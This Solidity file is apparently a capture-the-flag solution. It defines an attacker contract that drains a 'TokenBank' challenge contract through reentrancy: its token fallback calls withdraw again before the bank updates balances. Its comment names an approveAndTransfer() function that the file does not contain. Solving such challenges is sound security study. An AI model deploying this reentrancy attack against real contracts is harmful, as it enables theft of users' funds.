// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes calldata data) external;
}

interface ITokenBank {
    function withdraw(uint256 amount) external;
}

interface IToken {
    function transfer(address to, uint256 value) external returns (bool success);
    function transfer(address to, uint256 value, bytes calldata data) external returns (bool);
    function approve(address spender, uint256 value) 
        external
        returns (bool success);
    function transferFrom(address from, address to, uint256 value)
        external
        returns (bool success);
}

// 1. Call TOken to transfer() amount from wallet to this contract
// 2. Call approveAndTransfer() on this contract

contract TokenBankSolution is ITokenReceiver
{
    address owner;
    ITokenBank public tokenBank;
    IToken public token;

    bool public doItTwice = false;

    constructor()
    {
        owner = msg.sender;
    }

    function setTokenBank(address _tokenBank) external
    {
        tokenBank = ITokenBank(_tokenBank);
    }

    function setToken(address _token) external
    {
        token = IToken(_token);
    }

    function tokenFallback(address from, uint256 value, bytes calldata /*data*/) external
    {
        if (from == owner) {
            return;
        }

        if (from == address(tokenBank))
        {
            if (doItTwice) {
                doItTwice = false;

                tokenBank.withdraw(value);
            }
            return;
        }
    }

    function deposit(uint256 amount) external
    {
        bytes memory _empty = hex"00000000";
        token.transfer(address(tokenBank), amount, _empty);
    }

    function withdraw(uint256 amount) external
    {
        doItTwice = true;
        tokenBank.withdraw(amount);
    }
}